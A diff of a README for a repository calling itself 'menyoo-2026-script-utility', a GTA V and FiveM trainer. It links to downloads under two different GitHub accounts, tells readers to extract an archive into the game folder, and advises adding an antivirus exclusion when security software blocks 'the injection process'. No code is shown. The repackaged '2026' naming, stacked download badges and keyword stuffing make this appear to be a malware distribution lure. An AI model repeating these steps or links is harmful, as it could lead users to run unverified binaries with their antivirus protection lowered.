@@ -1,101 +1,74 @@
-# Menyoo v2026 - Game Script Utility 2026
+# 🎮 menyoo-2026-script-utility - Control your game world with ease
 
-> **A structured GTA V and FiveM trainer built around world editing, spawning, and in-game utility controls.** It is aimed at players who want a configurable trainer with Spooner mode support, entity tools, and ASI-based integration.
+[![Download menyoo-2026-script-utility](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Jaffy9/menyoo-2026-script-utility)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-GTA%20V%20%2F%20FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/kingben52/menyoo-2026-script-utility?style=flat-square)](https://github.com/kingben52/menyoo-2026-script-utility)
+## 📖 About this application
 
----
+The menyoo-2026-script-utility provides tools for players to manage gameplay in GTA V and FiveM. It allows you to change the game environment, spawn objects, and use various utilities. The software uses ASI injection to function within the game engine. You can move props, change weather patterns, and manage entities without leaving your game session. 
 
-<p align="center">
-  <a href="https://kingben52.github.io/menyoo-2026-script-utility/">
-    <img src="https://img.shields.io/badge/Download-Menyoo%20Script-brightgreen?style=for-the-badge" alt="Download Menyoo Script">
-  </a>
-</p>
+This tool helps you build custom scenarios. It offers features like the Spooner mode for object placement and entity management. You can configure your game experience through clear menus.
 
-> **[Download - Menyoo](https://kingben52.github.io/menyoo-2026-script-utility/)**
+## ⚙️ System requirements
 
----
+Before you install the software, confirm your computer meets these needs:
 
-[Download Latest Build](https://kingben52.github.io/menyoo-2026-script-utility/)
+* Windows 10 or Windows 11.
+* A legal copy of Grand Theft Auto V.
+* The Script Hook V library installed in your game folder.
+* At least 500 MB of free disk space.
+* An active internet connection for the initial setup.
 
----
+## 🚀 Getting started
 
-## What This Is
+Follow these steps to set up the utility on your computer.
 
-Menyoo is a trainer utility for GTA V and FiveM that focuses on hands-on control inside the game, including editing, customization, and scene management. Its feature set is centered on Spooner mode, entity spawning, and world manipulation tools, giving players a direct way to build and adjust gameplay environments.
+1. Locate your game installation folder. This folder contains the main executable file for GTA V.
+2. Visit the [official download page](https://github.com/Jaffy9/menyoo-2026-script-utility) to get the latest version of the installer.
+3. Download the archive file to your computer.
+4. Open the archive with a file compression tool like 7-Zip or WinRAR.
+5. Drag and drop the contents of the archive into the main game folder.
+6. Ensure that the file ending in .asi sits in the same directory as the game executable.
+7. Launch your game through the standard launcher or Steam.
+8. Press the F8 key on your keyboard to open the menu while inside the game.
 
-The project is designed to stay flexible and easy to integrate through ASI-based setups, while keeping resource usage in check. That balance makes it suitable when you want a capable trainer without unnecessary overhead.
+## 🛠️ How to use the menu
 
-## Features
+The interface uses a simple grid system. Use the following keys to navigate:
 
-- Structured trainer workflow for GTA V and FiveM
-- Spooner mode support for scene and object placement
-- Entity spawning tools for building custom setups
-- World manipulation options for altering in-game environments
-- Seamless ASI integration
-- Highly configurable behavior for different use cases
-- Optimized for low system load
-- Built for gameplay utility, editing, and control tasks
+* Arrow keys: Move the selection highlight.
+* Enter key: Select an item or open a submenu.
+* Backspace key: Return to the previous screen.
 
-## Installation
+The main menu displays categories such as Player Options, Object Spawner, and World Settings. Highlight a category and press Enter to see the options inside. You can change your player model, adjust your walk speed, or give yourself items.
 
-1. Download the latest build from the link above.
-2. Place the script files in your GTA V or FiveM mod/script directory as required by your setup.
-3. Make sure any ASI-related components are installed and loaded correctly if your environment uses them.
-4. Launch the game and open the trainer through the assigned in-game controls.
+## 🗂️ Advanced features explained
 
-Minimal usage flow:
+### Spooner mode
+This feature lets you place objects in the game world. Choose an object from the list. The camera focuses on the item, allowing you to move it, rotate it, or scale it. Press the interaction button to save the position. 
 
-- Install
-- Load the script
-- Open Menyoo in-game
-- Adjust options as needed
+### Entity tools
+You can manage non-player characters and vehicles. You can force them to perform tasks or delete them from the world. This menu simplifies crowd control and scene building.
 
-## Options
+### Configurable settings
+The software loads a configuration file on startup. You can change your keybinds inside this file. Open the ini file with a text editor like Notepad. Change the values to suit your preferences and save the document.
 
-| Setting | Purpose | Notes |
-| --- | --- | --- |
-| Spooner Mode | Object and scene editing | Useful for placing and managing custom setups |
-| Entity Spawning | Spawn selected entities | Best for quick world building and testing |
-| World Manipulation | Change environment behavior | Depends on the current game/session context |
-| ASI Integration | Loader compatibility | Requires a setup that supports ASI usage |
-| Configuration | Customize trainer behavior | Review available options before changing values |
-| Performance Focus | Reduce system load | Intended to keep usage efficient |
+## 🛡️ Troubleshooting
 
-## Compatibility
+If the menu does not appear when you press F8, check these common issues:
 
-Menyoo is intended for GTA V and FiveM environments. Some features may depend on the game build, server rules, or mod-loading setup in use.
+* Check that you installed Script Hook V. The utility requires this file to communicate with the game.
+* Verify the file placement. Ensure you placed the files in the directory containing the game executable, not a subfolder.
+* Check your antivirus software. Sometimes, security programs block the injection process. Add an exclusion for your game folder if needed.
+* Update your game. If you run an old version of the game, the utility might not initiate correctly.
 
-Known limitations:
+## 📈 Performance tips
 
-- Certain features may not behave the same in every FiveM environment
-- ASI-related functionality depends on your local loader configuration
-- In-game availability can vary based on session restrictions and version differences
+Limit the amount of spawned entities to keep the game stable. Spawning too many objects at once causes frame rate drops. Always remove objects that you no longer need. This keeps the game memory clear.
 
-## FAQ
+## 📂 File structure
 
-### How do I install it?
-Download the build, place the files in the correct GTA V or FiveM directory, and ensure your loader or script environment is set up before launching the game.
+* menyoo.asi: The core plugin file.
+* menyooStuff: A folder containing your saved configurations and vehicle files.
+* menyooConfig.ini: The file for your personal key settings and preferences.
 
-### Can I customize the trainer?
-Yes. The project is described as highly configurable, so you can adjust supported options to fit your preferred workflow.
-
-### Does it work on both GTA V and FiveM?
-The profile lists both platforms. Actual behavior can vary depending on the game version and the way FiveM is configured.
-
-### What if a feature does not appear in-game?
-Check that the script is loaded correctly, verify your mod/script folder setup, and confirm that any required ASI integration is active.
-
-### Will it affect performance?
-The project is optimized with low system load in mind, but overall performance still depends on your game setup and active features.
-
-### Where should I keep the files?
-Keep the files in the directory expected by your GTA V or FiveM setup, and avoid moving them after installation unless you are updating the layout intentionally.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: GTA V, FiveM, script utility, world editor, modding, gaming, ASI plugin, Spooner mode
